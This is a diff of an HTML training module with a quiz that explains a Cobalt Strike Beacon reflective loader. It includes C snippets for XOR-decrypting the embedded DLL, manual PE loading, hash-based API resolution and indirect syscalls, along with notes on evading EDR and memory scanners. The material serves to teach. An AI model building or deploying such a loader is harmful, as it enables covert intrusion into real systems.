@@ -60,7 +60,7 @@
 <tr><td><code>windows.h</code></td><td>Standard Windows type definitions (LPVOID, DWORD, BOOL, etc.)</td></tr>
 <tr><td><code>beacon.h</code></td><td>Cobalt Strike BUD structures: USER_DATA, SYSCALL_API, RTL_API, ALLOCATED_MEMORY</td></tr>
 <tr><td><code>gate.h</code></td><td>LibGate indirect syscall stubs and resolution functions</td></tr>
-<tr><td><code>tcg.h</code></td><td>LibTCG PE primitives: ParseDLL, LoadDLL, ProcessImports, FixSectionPermissions, EntryPoint</td></tr>
+<tr><td><code>tcg.h</code></td><td>LibTCG PE primitives: ParseDLL, LoadDLL, ProcessImports, EntryPoint (note: FixSectionPermissions is defined locally in loader.c, not in tcg.h)</td></tr>
 </table>
 </div>
 
@@ -81,7 +81,7 @@ DECLSPEC_IMPORT int            MSVCRT$strncmp(const char *, const char *, size_t
 
 <pre><code><span class="lang-tag">C - defines</span>#define NTDLL_HASH    0x3CFA685D           // ROR13 hash of "ntdll.dll"
 #define memset(x,y,z) __stosb((PBYTE)(x),(BYTE)(y),(SIZE_T)(z))
-#define GETRESOURCE(x) (PRESOURCE)&amp;x</code></pre>
+#define GETRESOURCE(x) (char *)&amp;x</code></pre>
 
 <div class="card">
 <h4>Define Breakdown</h4>
@@ -89,7 +89,7 @@ DECLSPEC_IMPORT int            MSVCRT$strncmp(const char *, const char *, size_t
 <tr><th>Define</th><th>Purpose</th></tr>
 <tr><td><code>NTDLL_HASH</code></td><td>Pre-computed ROR13 hash of the string "ntdll.dll" &mdash; used by ResolveSyscalls to find ntdll without string comparison</td></tr>
 <tr><td><code>memset</code></td><td>Macro replacing standard memset with the compiler intrinsic <code>__stosb</code> &mdash; avoids linking to the C runtime</td></tr>
-<tr><td><code>GETRESOURCE</code></td><td>Casts a zero-length array (section marker) to a PRESOURCE pointer, giving access to the length-prefixed data that Crystal Palace linked into that section</td></tr>
+<tr><td><code>GETRESOURCE</code></td><td>Casts a zero-length array (section marker) to a <code>char *</code>, giving access to the length-prefixed data that Crystal Palace linked into that section</td></tr>
 </table>
 </div>
 
@@ -104,13 +104,13 @@ char _KEY_[0] __attribute__((section("key")));</code></pre>
 
 <div class="card">
 <h4>The RESOURCE Structure</h4>
-<p>Every embedded resource is stored as a length-prefixed byte array. The first 4 bytes are a DWORD length, followed by the raw data. This structure lets the loader know exactly how many bytes to process without relying on sentinel values or section headers.</p>
+<p>Every embedded resource is stored as a length-prefixed byte array. The first field is an <code>int length</code>, followed by a <code>char value[]</code> flexible array member. This structure lets the loader know exactly how many bytes to process without relying on sentinel values or section headers.</p>
 </div>
 
 <pre><code><span class="lang-tag">C - RESOURCE typedef</span>typedef struct {
-    DWORD length;
-    BYTE  data[];
-} RESOURCE, *PRESOURCE;</code></pre>
+    int  length;
+    char value[];
+} RESOURCE;</code></pre>
 
 <div class="diagram">
 <h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Crystal Palace Link Pipeline</h4>
@@ -169,12 +169,12 @@ char _KEY_[0] __attribute__((section("key")));</code></pre>
 <h3>Step 1 &mdash; Get Embedded Resources</h3>
 <p>The loader retrieves pointers to the encrypted Beacon DLL and the XOR key from their respective PE sections using the <code>GETRESOURCE</code> macro.</p>
 
-<pre><code><span class="lang-tag">C - Step 1</span>PRESOURCE dll = GETRESOURCE(_DLL_);
-PRESOURCE key = GETRESOURCE(_KEY_);</code></pre>
+<pre><code><span class="lang-tag">C - Step 1</span>RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
+RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);</code></pre>
 
 <div class="card">
 <h4>What GETRESOURCE Returns</h4>
-<p><code>GETRESOURCE(_DLL_)</code> expands to <code>(PRESOURCE)&amp;_DLL_</code>. Since <code>_DLL_</code> is a zero-length array at the start of the "dll" section, its address points directly to the RESOURCE structure that Crystal Palace linked there. The <code>dll-&gt;length</code> field gives the encrypted payload size, and <code>dll-&gt;data</code> points to the encrypted bytes.</p>
+<p><code>GETRESOURCE(_DLL_)</code> expands to <code>(char *)&amp;_DLL_</code>. Since <code>_DLL_</code> is a zero-length array at the start of the "dll" section, its address points directly to the RESOURCE structure that Crystal Palace linked there. The caller then casts the result to <code>RESOURCE *</code>. The <code>dll-&gt;length</code> field gives the encrypted payload size, and <code>dll-&gt;value</code> points to the encrypted bytes.</p>
 </div>
 
 <!-- Step 2 -->
@@ -182,12 +182,12 @@ PRESOURCE key = GETRESOURCE(_KEY_);</code></pre>
 <p>A fresh RW buffer is allocated for the decrypted Beacon DLL. Each byte of the encrypted payload is XOR'd with the corresponding byte of the rotating key.</p>
 
 <pre><code><span class="lang-tag">C - Step 2</span>// Allocate RW buffer for the decrypted Beacon DLL
-PBYTE buf = KERNEL32$VirtualAlloc(NULL, dll-&gt;length,
+PBYTE src = KERNEL32$VirtualAlloc(NULL, dll-&gt;length,
     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
 // XOR-unmask: each byte of payload XOR'd with rotating key
 for (DWORD i = 0; i &lt; dll-&gt;length; i++)
-    buf[i] = dll-&gt;data[i] ^ key-&gt;data[i % key-&gt;length];</code></pre>
+    src[i] = dll-&gt;value[i] ^ key-&gt;value[i % key-&gt;length];</code></pre>
 
 <div class="card warn">
 <h4>Key Rotation</h4>
@@ -198,33 +198,38 @@ for (DWORD i = 0; i &lt; dll-&gt;length; i++)
 <h3>Step 3 &mdash; Parse PE</h3>
 <p>LibTCG's <code>ParseDLL</code> reads the PE headers from the decrypted buffer and populates a <code>DLLDATA</code> structure with section info, import table pointers, relocation data, and entry point offset.</p>
 
-<pre><code><span class="lang-tag">C - Step 3</span>DLLDATA dlldata;
-memset(&amp;dlldata, 0, sizeof(DLLDATA));
-ParseDLL(buf, &amp;dlldata);</code></pre>
+<pre><code><span class="lang-tag">C - Step 3</span>DLLDATA data;
+memset(&amp;data, 0, sizeof(DLLDATA));
+ParseDLL(src, &amp;data);</code></pre>
 
 <div class="card">
 <h4>DLLDATA Contents</h4>
-<p>After <code>ParseDLL</code>, the <code>dlldata</code> structure contains everything needed to manually load the DLL: the <code>IMAGE_NT_HEADERS</code> pointer, the section table, import directory RVA, relocation directory RVA, and the AddressOfEntryPoint. The original buffer (<code>buf</code>) is still needed as the source of section data.</p>
+<p>After <code>ParseDLL</code>, the <code>data</code> structure contains everything needed to manually load the DLL: the <code>IMAGE_NT_HEADERS</code> pointer, the section table, import directory RVA, relocation directory RVA, and the AddressOfEntryPoint. The original buffer (<code>src</code>) is still needed as the source of section data.</p>
 </div>
 
 <!-- Step 4 -->
 <h3>Step 4 &mdash; Allocate + Load DLL</h3>
 <p>A second allocation provides the final memory region where the Beacon DLL will live. <code>LoadDLL</code> copies sections to their correct virtual offsets, and <code>ProcessImports</code> resolves the Beacon DLL's own import table.</p>
 
-<pre><code><span class="lang-tag">C - Step 4</span>DWORD size = SizeOfDLL(&amp;dlldata);
+<pre><code><span class="lang-tag">C - Step 4</span>DWORD size = SizeOfDLL(&amp;data);
 PBYTE dst = KERNEL32$VirtualAlloc(NULL, size,
     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-LoadDLL(&amp;dlldata, dst);
-ProcessImports(&amp;dlldata, dst);</code></pre>
+LoadDLL(&amp;data, src, dst);
+
+// Initialize import resolution functions
+IMPORTFUNCS funcs;
+funcs.loadLibraryA = KERNEL32$LoadLibraryA;
+funcs.getProcAddress = KERNEL32$GetProcAddress;
+ProcessImports(&amp;funcs, &amp;data, dst);</code></pre>
 
 <div class="card">
 <h4>LibTCG Loading Primitives</h4>
 <table>
 <tr><th>Function</th><th>Responsibility</th></tr>
 <tr><td><code>SizeOfDLL</code></td><td>Returns <code>SizeOfImage</code> from the PE optional header &mdash; the total virtual size needed</td></tr>
-<tr><td><code>LoadDLL</code></td><td>Copies each PE section from <code>buf</code> to the correct offset in <code>dst</code>, applies base relocations</td></tr>
-<tr><td><code>ProcessImports</code></td><td>Walks the import descriptor table, resolves each imported function via PEB walking, patches the IAT</td></tr>
+<tr><td><code>LoadDLL</code></td><td>Takes three arguments: DLLDATA, source buffer (<code>src</code>), and destination (<code>dst</code>). Copies each PE section from <code>src</code> to the correct offset in <code>dst</code>, applies base relocations</td></tr>
+<tr><td><code>ProcessImports</code></td><td>Takes three arguments: an <code>IMPORTFUNCS</code> struct (holding LoadLibraryA and GetProcAddress pointers), DLLDATA, and destination. Walks the import descriptor table, resolves each imported function, patches the IAT</td></tr>
 </table>
 </div>
 
@@ -240,21 +245,21 @@ SYSCALL_API syscalls;
 memset(&amp;syscalls, 0, sizeof(SYSCALL_API));
 bud.syscalls = &amp;syscalls;
 
-RTL_API rtls;
-memset(&amp;rtls, 0, sizeof(RTL_API));
-bud.rtls = &amp;rtls;
+RTL_API rtlFunctions;
+memset(&amp;rtlFunctions, 0, sizeof(RTL_API));
+bud.rtls = &amp;rtlFunctions;
 
-ALLOCATED_MEMORY mem;
-memset(&amp;mem, 0, sizeof(ALLOCATED_MEMORY));
-bud.allocatedMemory = &amp;mem;</code></pre>
+ALLOCATED_MEMORY memory;
+memset(&amp;memory, 0, sizeof(ALLOCATED_MEMORY));
+bud.allocatedMemory = &amp;memory;</code></pre>
 
 <div class="card">
 <h4>BUD Sub-Structures</h4>
 <table>
 <tr><th>Structure</th><th>Field</th><th>Purpose</th></tr>
 <tr><td><code>USER_DATA</code></td><td><code>version</code></td><td>Cobalt Strike version identifier &mdash; Beacon uses this for compatibility checks</td></tr>
-<tr><td><code>SYSCALL_API</code></td><td><code>bud.syscalls</code></td><td>Contains function pointers for 35 Nt* syscall stubs that Beacon calls instead of using ntdll directly</td></tr>
-<tr><td><code>RTL_API</code></td><td><code>bud.rtls</code></td><td>Contains pointers to Rtl* utility functions (RtlCreateHeap, RtlAllocateHeap, etc.)</td></tr>
+<tr><td><code>SYSCALL_API</code></td><td><code>bud.syscalls</code></td><td>Contains function pointers for 36 Nt* syscall stubs that Beacon calls instead of using ntdll directly</td></tr>
+<tr><td><code>RTL_API</code></td><td><code>bud.rtls</code></td><td>Contains pointers to Rtl* utility functions (rtlDosPathNameToNtPathNameUWithStatus, rtlFreeHeap, and rtlGetProcessHeap)</td></tr>
 <tr><td><code>ALLOCATED_MEMORY</code></td><td><code>bud.allocatedMemory</code></td><td>Tracks memory regions so Beacon's sleep mask can encrypt/decrypt them during sleep cycles</td></tr>
 </table>
 </div>
@@ -263,7 +268,7 @@ bud.allocatedMemory = &amp;mem;</code></pre>
 <h3>Step 6 &mdash; Fix Section Permissions + Track Memory</h3>
 <p>After loading, all sections are RW. <code>FixSectionPermissions</code> iterates through each PE section and calls <code>VirtualProtect</code> with the correct permission flags. It also populates the <code>ALLOCATED_MEMORY_REGION</code> metadata so Beacon knows the layout of its own memory.</p>
 
-<pre><code><span class="lang-tag">C - Step 6</span>FixSectionPermissions(&amp;dlldata, dst, &amp;mem.AllocatedMemoryRegions[0]);</code></pre>
+<pre><code><span class="lang-tag">C - Step 6</span>FixSectionPermissions(&amp;data, dst, &amp;memory.AllocatedMemoryRegions[0]);</code></pre>
 
 <div class="card">
 <h4>Section Permission Mapping</h4>
@@ -286,9 +291,9 @@ bud.allocatedMemory = &amp;mem;</code></pre>
 <h3>Step 7 &mdash; Set Cleanup Info</h3>
 <p>The loader tells Beacon how the memory was allocated and whether Beacon should clean it up. This metadata is critical for Beacon's sleep masking &mdash; it needs to know the allocation method to correctly free or re-protect memory during sleep.</p>
 
-<pre><code><span class="lang-tag">C - Step 7</span>mem.AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;
-mem.AllocatedMemoryRegions[0].CleanupInformation.Cleanup = TRUE;
-mem.AllocatedMemoryRegions[0].Purpose = PURPOSE_BEACON_MEMORY;</code></pre>
+<pre><code><span class="lang-tag">C - Step 7</span>memory.AllocatedMemoryRegions[0].CleanupInformation.AllocationMethod = METHOD_VIRTUALALLOC;
+memory.AllocatedMemoryRegions[0].CleanupInformation.Cleanup = TRUE;
+memory.AllocatedMemoryRegions[0].Purpose = PURPOSE_BEACON_MEMORY;</code></pre>
 
 <div class="card">
 <h4>Cleanup Fields</h4>
@@ -305,30 +310,30 @@ mem.AllocatedMemoryRegions[0].Purpose = PURPOSE_BEACON_MEMORY;</code></pre>
 <p>Two resolution functions populate the BUD sub-structures with live function pointers. These pointers allow Beacon to execute syscalls indirectly (through LibGate stubs) and call Rtl* utilities without importing them.</p>
 
 <pre><code><span class="lang-tag">C - Step 8</span>ResolveSyscalls(&amp;syscalls);
-ResolveRtlFunctions(&amp;rtls);</code></pre>
+ResolveRtlFunctions(&amp;rtlFunctions);</code></pre>
 
 <div class="card highlight">
 <h4>Why Resolve at Load Time?</h4>
-<p>By resolving all 35 Nt* functions and the Rtl* utilities during loading, Beacon avoids making <code>GetProcAddress</code> calls during operation. Every API call Beacon makes goes through pre-resolved function pointers in the BUD. This eliminates a major detection surface: EDR products that hook <code>GetProcAddress</code> and <code>LdrGetProcedureAddress</code> will never see Beacon's resolution activity.</p>
+<p>By resolving all 36 Nt* functions and the Rtl* utilities during loading, Beacon avoids making <code>GetProcAddress</code> calls during operation. Every API call Beacon makes goes through pre-resolved function pointers in the BUD. This eliminates a major detection surface: EDR products that hook <code>GetProcAddress</code> and <code>LdrGetProcedureAddress</code> will never see Beacon's resolution activity.</p>
 </div>
 
 <!-- Step 9 -->
 <h3>Step 9 &mdash; Get Entry Point, Clean Up, Call Beacon</h3>
 <p>The final step resolves the Beacon DLL's entry point, frees the decrypted buffer (no longer needed), and makes the three DllMain calls that constitute the Cobalt Strike initialization protocol.</p>
 
-<pre><code><span class="lang-tag">C - Step 9</span>DLLMAIN_FUNC entryPoint = (DLLMAIN_FUNC)EntryPoint(&amp;dlldata, dst);
+<pre><code><span class="lang-tag">C - Step 9</span>DLLMAIN_FUNC entryPoint = (DLLMAIN_FUNC)EntryPoint(&amp;data, dst);
 
 // Free the decrypted buffer (no longer needed)
-KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
 
 // Three DllMain calls &mdash; this is the Cobalt Strike protocol:
-entryPoint(0, DLL_BEACON_USER_DATA, &amp;bud);   // Pass BUD to Beacon
-entryPoint(dst, DLL_PROCESS_ATTACH, NULL);     // Standard DLL init
-entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
+entryPoint((HINSTANCE)0, DLL_BEACON_USER_DATA, &amp;bud);            // Pass BUD to Beacon
+entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);             // Standard DLL init
+entryPoint((HINSTANCE)GETRESOURCE(go), DLL_BEACON_START, NULL);   // Start Beacon</code></pre>
 
 <div class="card warn">
 <h4>Buffer Cleanup Timing</h4>
-<p>The decrypted buffer (<code>buf</code>) is freed <strong>before</strong> calling Beacon's entry point. This is intentional: the buffer contains a fully decrypted copy of the Beacon DLL, which would be trivially detectable by a memory scanner. By freeing it before Beacon starts operating, the loader minimizes the window during which a cleartext DLL exists in memory. The loaded copy at <code>dst</code> has proper section permissions and looks like a normally loaded module.</p>
+<p>The decrypted buffer (<code>src</code>) is freed <strong>before</strong> calling Beacon's entry point. This is intentional: the buffer contains a fully decrypted copy of the Beacon DLL, which would be trivially detectable by a memory scanner. By freeing it before Beacon starts operating, the loader minimizes the window during which a cleartext DLL exists in memory. The loaded copy at <code>dst</code> has proper section permissions and looks like a normally loaded module.</p>
 </div>
 
 <!-- ==================== SECTION 4: THREE DLLMAIN CALLS ==================== -->
@@ -387,10 +392,10 @@ entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
 
 <p>The <code>resolve()</code> function is the bridge between BOF-style import declarations and runtime API resolution. Crystal Palace's DFR mechanism rewrites every <code>KERNEL32$VirtualAlloc</code> call into a <code>resolve(KERNEL32_HASH, VirtualAlloc_HASH)</code> call at link time.</p>
 
-<pre><code><span class="lang-tag">C - resolve()</span>PVOID resolve(DWORD moduleHash, DWORD functionHash)
+<pre><code><span class="lang-tag">C - resolve()</span>char * resolve(DWORD modHash, DWORD funcHash)
 {
-    PVOID mod = findModuleByHash(moduleHash);
-    return findFunctionByHash(mod, functionHash);
+    PVOID mod = findModuleByHash(modHash);
+    return findFunctionByHash(mod, funcHash);
 }</code></pre>
 
 <div class="diagram">
@@ -410,8 +415,8 @@ entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
 <h4>Resolution Internals</h4>
 <table>
 <tr><th>Function</th><th>Mechanism</th><th>Returns</th></tr>
-<tr><td><code>findModuleByHash</code></td><td>Walks the PEB's <code>InLoadOrderModuleList</code>, computes ROR13 hash of each DLL name, compares against <code>moduleHash</code></td><td>Base address of the target DLL</td></tr>
-<tr><td><code>findFunctionByHash</code></td><td>Parses the DLL's Export Address Table (EAT), computes ROR13 hash of each export name, compares against <code>functionHash</code></td><td>Address of the target function</td></tr>
+<tr><td><code>findModuleByHash</code></td><td>Walks the PEB's <code>InLoadOrderModuleList</code>, computes ROR13 hash of each DLL name, compares against <code>modHash</code></td><td>Base address of the target DLL</td></tr>
+<tr><td><code>findFunctionByHash</code></td><td>Parses the DLL's Export Address Table (EAT), computes ROR13 hash of each export name, compares against <code>funcHash</code></td><td>Address of the target function</td></tr>
 </table>
 </div>
 
@@ -421,76 +426,77 @@ entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
 </div>
 
 <!-- ==================== SECTION 6: RESOLVESYSCALLS ==================== -->
-<h2>6. ResolveSyscalls() &mdash; All 35 Nt* Functions</h2>
+<h2>6. ResolveSyscalls() &mdash; All 36 Nt* Functions</h2>
 
 <p><code>ResolveSyscalls</code> populates the <code>SYSCALL_API</code> structure with resolved entries for every Nt* function that Beacon supports. Each entry contains both the function address and the syscall number (SSN), enabling LibGate's indirect syscall mechanism.</p>
 
-<pre><code><span class="lang-tag">C - ResolveSyscalls()</span>void ResolveSyscalls(PSYSCALL_API syscalls)
+<pre><code><span class="lang-tag">C - ResolveSyscalls()</span>void ResolveSyscalls(SYSCALL_API * syscalls)
 {
     PVOID ntdll = findModuleByHash(NTDLL_HASH);
 
     ResolveSyscallEntry(ntdll,
         findFunctionByHash(ntdll, NtAllocateVirtualMemory_HASH),
-        &amp;syscalls-&gt;NtAllocateVirtualMemory);
+        &amp;syscalls-&gt;ntAllocateVirtualMemory);
     ResolveSyscallEntry(ntdll,
-        findFunctionByHash(ntdll, NtClose_HASH),
-        &amp;syscalls-&gt;NtClose);
-    // ... 33 more Nt* functions
+        findFunctionByHash(ntdll, NtProtectVirtualMemory_HASH),
+        &amp;syscalls-&gt;ntProtectVirtualMemory);
+    // ... 34 more Nt* functions
     ResolveSyscallEntry(ntdll,
         findFunctionByHash(ntdll, NtWaitForMultipleObjects_HASH),
-        &amp;syscalls-&gt;NtWaitForMultipleObjects);
+        &amp;syscalls-&gt;ntWaitForMultipleObjects);
 }</code></pre>
 
 <div class="card">
 <h4>ResolveSyscallEntry Internals</h4>
 <p>Each call to <code>ResolveSyscallEntry</code> does three things:</p>
 <ol>
-<li>Stores the function address in the SYSCALL_ENTRY</li>
+<li>Stores the function address in the SYSCALL_API_ENTRY</li>
 <li>Reads the SSN (System Service Number) from the <code>mov eax, SSN</code> instruction at the start of the ntdll stub</li>
 <li>Locates the <code>syscall</code> instruction within the stub for indirect syscall execution</li>
 </ol>
 </div>
 
 <div class="card highlight">
-<h4>Complete SYSCALL_API &mdash; All 35 Nt* Functions</h4>
-<p>The following table lists every Nt* function in the Beacon SYSCALL_API structure. These cover all system-level operations that Beacon performs: memory management, process/thread manipulation, file I/O, synchronization, and object management.</p>
+<h4>Complete SYSCALL_API &mdash; All 36 Nt* Functions</h4>
+<p>The following table lists every Nt* function in the Beacon SYSCALL_API structure (field names use lowercase <code>nt</code> prefix). These cover all system-level operations that Beacon performs: memory management, process/thread manipulation, file I/O, and object management.</p>
 <table>
-<tr><th>#</th><th>Function</th><th>Category</th></tr>
-<tr><td>1</td><td><code>NtAllocateVirtualMemory</code></td><td>Memory</td></tr>
-<tr><td>2</td><td><code>NtClose</code></td><td>Object</td></tr>
-<tr><td>3</td><td><code>NtContinue</code></td><td>Exception</td></tr>
-<tr><td>4</td><td><code>NtCreateEvent</code></td><td>Synchronization</td></tr>
-<tr><td>5</td><td><code>NtCreateFile</code></td><td>File I/O</td></tr>
-<tr><td>6</td><td><code>NtCreateMutant</code></td><td>Synchronization</td></tr>
-<tr><td>7</td><td><code>NtCreateNamedPipeFile</code></td><td>IPC</td></tr>
-<tr><td>8</td><td><code>NtCreateSection</code></td><td>Memory</td></tr>
-<tr><td>9</td><td><code>NtCreateThread</code></td><td>Thread</td></tr>
-<tr><td>10</td><td><code>NtCreateThreadEx</code></td><td>Thread</td></tr>
-<tr><td>11</td><td><code>NtDuplicateObject</code></td><td>Object</td></tr>
-<tr><td>12</td><td><code>NtFreeVirtualMemory</code></td><td>Memory</td></tr>
-<tr><td>13</td><td><code>NtGetContextThread</code></td><td>Thread</td></tr>
-<tr><td>14</td><td><code>NtMapViewOfSection</code></td><td>Memory</td></tr>
-<tr><td>15</td><td><code>NtOpenEvent</code></td><td>Synchronization</td></tr>
-<tr><td>16</td><td><code>NtOpenFile</code></td><td>File I/O</td></tr>
-<tr><td>17</td><td><code>NtOpenMutant</code></td><td>Synchronization</td></tr>
-<tr><td>18</td><td><code>NtOpenProcess</code></td><td>Process</td></tr>
-<tr><td>19</td><td><code>NtOpenThread</code></td><td>Thread</td></tr>
-<tr><td>20</td><td><code>NtProtectVirtualMemory</code></td><td>Memory</td></tr>
-<tr><td>21</td><td><code>NtQueryInformationProcess</code></td><td>Process</td></tr>
-<tr><td>22</td><td><code>NtQueryInformationThread</code></td><td>Thread</td></tr>
-<tr><td>23</td><td><code>NtQuerySystemInformation</code></td><td>System</td></tr>
-<tr><td>24</td><td><code>NtQueryVirtualMemory</code></td><td>Memory</td></tr>
-<tr><td>25</td><td><code>NtQueueApcThread</code></td><td>Thread</td></tr>
-<tr><td>26</td><td><code>NtReadFile</code></td><td>File I/O</td></tr>
-<tr><td>27</td><td><code>NtReadVirtualMemory</code></td><td>Memory</td></tr>
-<tr><td>28</td><td><code>NtResumeThread</code></td><td>Thread</td></tr>
-<tr><td>29</td><td><code>NtSetContextThread</code></td><td>Thread</td></tr>
-<tr><td>30</td><td><code>NtSetInformationThread</code></td><td>Thread</td></tr>
-<tr><td>31</td><td><code>NtTerminateProcess</code></td><td>Process</td></tr>
-<tr><td>32</td><td><code>NtTerminateThread</code></td><td>Thread</td></tr>
-<tr><td>33</td><td><code>NtUnmapViewOfSection</code></td><td>Memory</td></tr>
-<tr><td>34</td><td><code>NtWaitForSingleObject</code></td><td>Synchronization</td></tr>
-<tr><td>35</td><td><code>NtWaitForMultipleObjects</code></td><td>Synchronization</td></tr>
+<tr><th>#</th><th>Field Name</th><th>Category</th></tr>
+<tr><td>1</td><td><code>ntAllocateVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>2</td><td><code>ntProtectVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>3</td><td><code>ntFreeVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>4</td><td><code>ntGetContextThread</code></td><td>Thread</td></tr>
+<tr><td>5</td><td><code>ntSetContextThread</code></td><td>Thread</td></tr>
+<tr><td>6</td><td><code>ntResumeThread</code></td><td>Thread</td></tr>
+<tr><td>7</td><td><code>ntCreateThreadEx</code></td><td>Thread</td></tr>
+<tr><td>8</td><td><code>ntOpenProcess</code></td><td>Process</td></tr>
+<tr><td>9</td><td><code>ntOpenThread</code></td><td>Thread</td></tr>
+<tr><td>10</td><td><code>ntClose</code></td><td>Object</td></tr>
+<tr><td>11</td><td><code>ntCreateSection</code></td><td>Memory</td></tr>
+<tr><td>12</td><td><code>ntMapViewOfSection</code></td><td>Memory</td></tr>
+<tr><td>13</td><td><code>ntUnmapViewOfSection</code></td><td>Memory</td></tr>
+<tr><td>14</td><td><code>ntQueryVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>15</td><td><code>ntDuplicateObject</code></td><td>Object</td></tr>
+<tr><td>16</td><td><code>ntReadVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>17</td><td><code>ntWriteVirtualMemory</code></td><td>Memory</td></tr>
+<tr><td>18</td><td><code>ntReadFile</code></td><td>File I/O</td></tr>
+<tr><td>19</td><td><code>ntWriteFile</code></td><td>File I/O</td></tr>
+<tr><td>20</td><td><code>ntCreateFile</code></td><td>File I/O</td></tr>
+<tr><td>21</td><td><code>ntQueueApcThread</code></td><td>Thread</td></tr>
+<tr><td>22</td><td><code>ntCreateProcess</code></td><td>Process</td></tr>
+<tr><td>23</td><td><code>ntOpenProcessToken</code></td><td>Token</td></tr>
+<tr><td>24</td><td><code>ntTestAlert</code></td><td>Thread</td></tr>
+<tr><td>25</td><td><code>ntSuspendProcess</code></td><td>Process</td></tr>
+<tr><td>26</td><td><code>ntResumeProcess</code></td><td>Process</td></tr>
+<tr><td>27</td><td><code>ntQuerySystemInformation</code></td><td>System</td></tr>
+<tr><td>28</td><td><code>ntQueryDirectoryFile</code></td><td>File I/O</td></tr>
+<tr><td>29</td><td><code>ntSetInformationProcess</code></td><td>Process</td></tr>
+<tr><td>30</td><td><code>ntSetInformationThread</code></td><td>Thread</td></tr>
+<tr><td>31</td><td><code>ntQueryInformationProcess</code></td><td>Process</td></tr>
+<tr><td>32</td><td><code>ntQueryInformationThread</code></td><td>Thread</td></tr>
+<tr><td>33</td><td><code>ntOpenSection</code></td><td>Memory</td></tr>
+<tr><td>34</td><td><code>ntAdjustPrivilegesToken</code></td><td>Token</td></tr>
+<tr><td>35</td><td><code>ntDeviceIoControlFile</code></td><td>File I/O</td></tr>
+<tr><td>36</td><td><code>ntWaitForMultipleObjects</code></td><td>Synchronization</td></tr>
 </table>
 </div>
 
@@ -498,21 +504,15 @@ entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
 <h4>Category Breakdown</h4>
 <table>
 <tr><th>Category</th><th>Count</th><th>Examples</th></tr>
-<tr><td>Memory</td><td>7</td><td>NtAllocateVirtualMemory, NtFreeVirtualMemory, NtProtectVirtualMemory, NtMapViewOfSection</td></tr>
-<tr><td>Thread</td><td>8</td><td>NtCreateThread, NtCreateThreadEx, NtResumeThread, NtGetContextThread</td></tr>
-<tr><td>Synchronization</td><td>5</td><td>NtCreateEvent, NtCreateMutant, NtWaitForSingleObject</td></tr>
-<tr><td>File I/O</td><td>3</td><td>NtCreateFile, NtOpenFile, NtReadFile</td></tr>
-<tr><td>Process</td><td>3</td><td>NtOpenProcess, NtQueryInformationProcess, NtTerminateProcess</td></tr>
-<tr><td>Object</td><td>2</td><td>NtClose, NtDuplicateObject</td></tr>
-<tr><td>IPC</td><td>1</td><td>NtCreateNamedPipeFile</td></tr>
-<tr><td>Exception</td><td>1</td><td>NtContinue</td></tr>
-<tr><td>System</td><td>1</td><td>NtQuerySystemInformation</td></tr>
+<tr><td>Memory</td><td>10</td><td>ntAllocateVirtualMemory, ntProtectVirtualMemory, ntFreeVirtualMemory, ntCreateSection, ntMapViewOfSection, ntOpenSection</td></tr>
+<tr><td>Thread</td><td>9</td><td>ntGetContextThread, ntSetContextThread, ntResumeThread, ntCreateThreadEx, ntQueueApcThread, ntTestAlert</td></tr>
+<tr><td>Process</td><td>6</td><td>ntOpenProcess, ntCreateProcess, ntSuspendProcess, ntResumeProcess, ntSetInformationProcess, ntQueryInformationProcess</td></tr>
+<tr><td>File I/O</td><td>5</td><td>ntReadFile, ntWriteFile, ntCreateFile, ntQueryDirectoryFile, ntDeviceIoControlFile</td></tr>
+<tr><td>Token</td><td>2</td><td>ntOpenProcessToken, ntAdjustPrivilegesToken</td></tr>
+<tr><td>Object</td><td>2</td><td>ntClose, ntDuplicateObject</td></tr>
+<tr><td>System</td><td>1</td><td>ntQuerySystemInformation</td></tr>
+<tr><td>Synchronization</td><td>1</td><td>ntWaitForMultipleObjects</td></tr>
 </table>
-</div>
-
-<div class="card green">
-<h4>NtWriteVirtualMemory</h4>
-<p>Note that <code>NtWriteVirtualMemory</code> is the 36th entry sometimes referenced in documentation, but it is resolved as part of the standard 35-function set depending on the Cobalt Strike version. The SYSCALL_API structure in <code>beacon.h</code> defines exactly 35 SYSCALL_ENTRY slots for CS 4.11.</p>
 </div>
 
 <!-- ==================== QUIZ ==================== -->
@@ -542,8 +542,8 @@ entryPoint(go, DLL_BEACON_START, NULL);         // Start Beacon</code></pre>
 <label data-opt="0"><input type="radio" name="q5_2"> 12</label>
 <label data-opt="1"><input type="radio" name="q5_2"> 20</label>
 <label data-opt="2"><input type="radio" name="q5_2"> 28</label>
-<label data-opt="3"><input type="radio" name="q5_2"> 35</label>
-<div class="explain">Correct! The SYSCALL_API structure in beacon.h defines exactly 35 SYSCALL_ENTRY slots for Cobalt Strike 4.11. These cover all system-level operations Beacon needs: memory management (7), thread operations (8), synchronization (5), file I/O (3), process operations (3), object management (2), IPC (1), exception handling (1), and system queries (1).</div>
+<label data-opt="3"><input type="radio" name="q5_2"> 36</label>
+<div class="explain">Correct! The SYSCALL_API structure in beacon.h defines exactly 36 SYSCALL_API_ENTRY slots for Cobalt Strike 4.11. These cover all system-level operations Beacon needs: memory management (10), thread operations (9), process operations (6), file I/O (5), token operations (2), object management (2), system queries (1), and synchronization (1).</div>
 </div>
 
 <button class="quiz-btn" onclick="gradeQuiz('quiz5')">Check Answers</button>
